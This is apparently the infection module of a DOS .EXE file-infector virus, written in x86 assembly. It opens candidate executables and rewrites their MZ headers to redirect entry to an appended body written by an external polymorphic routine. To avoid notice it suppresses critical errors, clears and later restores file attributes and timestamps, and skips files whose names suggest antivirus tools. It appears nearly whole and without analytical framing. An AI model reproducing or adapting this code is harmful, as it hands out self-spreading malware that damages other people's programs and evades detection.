include .\sylvia_p\star.inc
include .\sylvia_p\short.inc
include .\sylvia_p\strucs.inc

include vdata.ash
include startup.ash

extrn	Poly_Write:PROC

;----------------------------------------------------------------------------
			.model tiny
			.286
			
			jumps
			locals @@

;============================================================================
			.code
;----------------------------------------------------------------------------
			PUBLIC	PASCAL Infect
Infect			PROC	PASCAL NEAR
			arg	name_ptr:dword=PARM_SIZE
			local	attrib:word, date:word, time:word, handle:word

			mov	ax,3524h
			int	21h
			mov	ah,25h
			push	ax es bx
			mov	dx,offset Int_24h_Handler
			int	21h

			or	attrib,-1
			or	date,-1
			or	time,-1
			or	handle,-1
			DO
			  lds	si,name_ptr
			  push	si
			  call	Check_Name
			  pop	dx
			  EXIT	C
			  mov	ax,4300h
			  int	21h
			  EXIT	C
			  mov	attrib,cx
			  xor	cx,cx
			  mov	ax,4301h
			  int	21h
			  EXIT	C
			  mov	ax,3D02h
			  int	21h
			  EXIT	C
			  mov	handle,ax
			  xchg	bx,ax
			  mov	ax,5700h
			  int	21h
			  EXIT	C
			  mov	time,cx
			  mov	date,dx
			  mvs	ds,cs
			  mvs	es,cs
			  call	Infect_BX
			DONE			
			mov	bx,handle
			cmp	bx,-1
			DOIF	NE
			 mov	cx,time
			 mov	dx,date
			 cmp	dx,-1
			 EXIT	E
			 cmp	cx,-1
			 EXIT	E
			 mov	ax,5701h
			 int	21h
			 mov	ah,3Eh
			 int	21h
			DONE
			lds	dx,name_ptr
			mov	ax,4301h
			mov	cx,attrib
			cmp	cx,-1
			DOIF	NE
			 int	21h
			DONE
			pop	dx ds ax
			int	21h
			ret

Infect			ENDP

;----------------------------------------------------------------------------
Check_Name		PROC	NEAR

			mov	di,si
		@@Main_Loop:
			  lodsb
			  cmp	al,':'
			  DOIF	NE
			   cmp	al,'\'
			  DONE
			  DOIF	E
			   mov	di,si
			   jmp	@@Main_Loop
			  DONE
			  or	al,al
			  jz	@@Bad_Name
			  cmp	al,'.'
			  jne	@@Main_Loop
			  mov	ax,wo ds:[si]
			  or	ax,2020h
			  cmp	ax,'xe'
			  jne	@@Bad_Name
			  mov	ah,20h
			  or	ah,by ds:[si+2]
			  cmp	ah,al
			  jne	@@Bad_Name
			  mov	ax,ds:[si-3]
			  and	ax,0DFDFh
			  cmp	ax,'NA'
			  je	@@Bad_Name
			  std
			  mov	ax,wo ds:[di]
			  and	ax,0DFDFh
			  cmp	ax,'BT'
			  je	@@Bad_Name
			  cmp	ax,'RD'
			  je	@@Bad_Name
			  cmp	ax,'CI'
			  je	@@Bad_Name
			  DO
			   lodsb
			   cmp	al,'0'
			   DOIF AE
			    cmp al,'9'
			    jbe	@@Bad_Name
			   DONE
			   cmp	al,'-'
			   je	@@Bad_Name
			   or	al,20h
			   cmp	al,'v'
			   je	@@Bad_Name
			   cmp	si,di
			  CYCLE	NB
			  ;
			  ;
		@@Good_Name:
			test	al,-1
			org	$-1
		@@Bad_Name:
			stc
			cld
			ret

Check_Name		ENDP

;----------------------------------------------------------------------------
Infect_BX		PROC	PASCAL NEAR
			local	Infected_Header:DOSEXE_Header

			mov	by ds:[StartExit+1],-1
			mov	by ds:[JA_JB],77h
			and	wo ds:[_envLng],0
			mov	ah,03Fh
			mov	cx,SIZE DOSEXE_Header
			mov	dx,ofs Clean_EXE_Header
			mov	si,dx
			call	IO_21h
			jc	@@ret_b
			cmp	[si.eh_Marker],'ZM'
			jne	@@ret_b
			call	FileSize_to_Pages
			cmp	[si.eh_Pages_Mod512],dx
			jne	@@ret_b
			cmp	[si.eh_Pages_Div512],ax
			jne	@@ret_b
			cmp	ax,10	; < 5k
			jb	@@ret_b
			cmp	ax,1000	; > 500k
			ja	@@ret_b
			cmp	[si.eh_Relocation_Ofs],40h
			jae	@@ret_b
			mov	ax,[si.eh_MaxMem_Paragraphs]
			inc	ax
			jnz	@@ret_b
			cmp	ax,[si.eh_Overlay_Number]
			DOIF	NZ	
	@@ret_b:	 jmp	@@ret
			DONE
			;
			cmp	[si.eh_IP],100h
			DOIF	E
			 cmp	[si.eh_SP],2000h
			DONE
			je	@@ret_b
	;cmp	[si.eh_Checksum],0F242h
	;jne	@@ret   ;
			;
			mov	cx,SIZE DOSEXE_Header
			lea	di,Infected_Header
			rep	movsb
			mov	Infected_Header.eh_IP,0100h
			mov	Infected_Header.eh_SP,2000h			
			min	Infected_Header.eh_MinMem_Paragraphs,210h
			mov	al,02h
			call	Seek0
			neg	ax
			and	ax,0Fh
			xchg	dx,ax
			mov	ax,4201h
			xor	cx,cx
			int	21h
			div	wo _10
			sub	ax,Infected_Header.eh_Header_Paragraphs
			mov	Infected_Header.eh_SS,ax
			sub	ax,10h
		_10	=	$-2
			mov	Infected_Header.eh_CS,ax

			call	Poly_Write
			jc	@@ret
			call	FileSize_to_Pages
			mov	Infected_Header.eh_Pages_Mod512,dx
			mov	Infected_Header.eh_Pages_Div512,ax
			xor	al,al
			call	Seek0
			mov	ah,40h
			mov	cx,SIZE DOSEXE_Header
			lea	dx,Infected_Header
			call	IO_21h															
		@@ret:	ret

Infect_BX		ENDP

;----------------------------------------------------------------------------
IO_21h			PROC	NEAR
			PUBLIC	IO_21h

			int	21h
			DOIF	NC
			 cmp	ax,cx
			DONE
			ret

IO_21h			ENDP

;----------------------------------------------------------------------------
FileSize_To_Pages	PROC	NEAR

			mov	al,02h
			call	Seek0
			mov	ch,02
			div	cx
			dec	dx
			DOIF	NS
			 inc	ax
			DONE
			inc	dx
			ret

FileSize_To_Pages	ENDP

;----------------------------------------------------------------------------
Seek0			PROC	NEAR

			mov	ah,42h
			xor	cx,cx
			cwd
			int	21h
			ret

Seek0			ENDP

;----------------------------------------------------------------------------
Int_24h_Handler		PROC	PASCAL FAR
			arg	iflags:word

			xor	ax,ax
			stc
			ret

Int_24h_Handler		ENDP

;============================================================================
			END